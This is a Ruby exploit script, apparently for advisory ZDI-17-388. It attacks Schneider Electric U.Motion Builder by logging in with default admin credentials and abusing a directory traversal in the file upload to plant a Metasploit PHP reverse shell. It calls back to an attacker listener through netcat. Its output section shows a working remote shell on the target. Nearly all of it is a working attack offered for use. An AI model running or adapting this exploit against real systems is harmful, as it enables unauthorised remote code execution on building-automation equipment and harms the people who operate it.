#!/usr/bin/env ruby 
# ZDI-17-388
# This module exploits a directory traversal arbitrary file upload in 
# Schneider Electric U.Motion Builder to install an agent. 

require 'rex'
require 'msfenv'
require 'msf/core'
require 'msf/base'
require 'rex/mime'

sock = Rex::Proto::Http::Client.new("192.168.2.173", port = "8080", context = {}, ssl = false)

login = "username=admin&password=admin&rememberMe=1&context=runtime&op=login"

req = sock.request_cgi(
        {
                'uri'   => "/umotion/modules/system/user_login.php",
                'version' => '1.0',
                'method' => 'POST',
                'data' => login,
        })

        sock.send_request(req)
        data = sock.read_response()
       
        if data.headers['Set-Cookie']
		sessionid = data.headers['Set-Cookie'].split(';')[0]
		
			$framework = Msf::Simple::Framework.create(
			:module_types => [ Msf::MODULE_PAYLOAD, Msf::MODULE_ENCODER, Msf::MODULE_NOP ]
		)
			payload = $framework.payloads.create("php/reverse_php")
			php_payload = Msf::Simple::Payload.generate_simple(payload,
				{
					'OptionStr' => "LHOST=192.168.2.1 LPORT=1975",
					'Format'    => 'raw',
				})

		phpstuff = %Q|<?php #{php_payload} ?>|
		page = Rex::Text.rand_text_alpha_upper(5) + ".php"

		dbl = Rex::MIME::Message.new
		dbl.add_part("../system/", nil, nil, "form-data; name=\"upload_path_to\"")
		dbl.add_part("1", nil, nil, "form-data; name=\"upload\"")
		dbl.add_part("0", nil, nil, "form-data; name=\"upload_local\"")
		dbl.add_part("0", nil, nil, "form-data; name=\"upload_local_file\"")
		dbl.add_part("0", nil, nil, "form-data; name=\"upload_local_path_from\"")
		dbl.add_part("0", nil, nil, "form-data; name=\"delete\"")
		dbl.add_part("", nil, nil, "form-data; name=\"delete_file_name\"")
		dbl.add_part(phpstuff, "application/octet-stream", nil, "form-data; name=\"upload_file\" ; filename=\"#{page}\"")
		data = dbl.to_s

		req = sock.request_cgi(
			{
				'uri'   => "/umotion/modules/system/file_picker.php",
				'version' => '1.0',
				'method' => 'POST',
				'ctype'   => "multipart/form-data; boundary=#{dbl.bound}",
				'cookie' => sessionid,
				'data' => data,
			})

		sock.send_request(req)
		data = sock.read_response()

		if data and data.body =~ /user_login/
			puts "[!] Failed!"
		else
			req = sock.request_raw({ 'uri' => "/umotion/modules/system/#{page}", 'method' => 'GET' })
			sock.send_request(req)
			puts "[*] Waiting for shell..."
			system("nc -l 1975")
			exit
		
		end
	end
__END__
$ sudo ruby schneider_file_picker.rb 
[*] Waiting for shell...
id
uid=1003(dpadweb) gid=1001(dlabusers) groups=1001(dlabusers),29(audio),44(video),104(netdev)
pwd
/mnt/storage/RWdlabs/smartdomuspad/modules/system

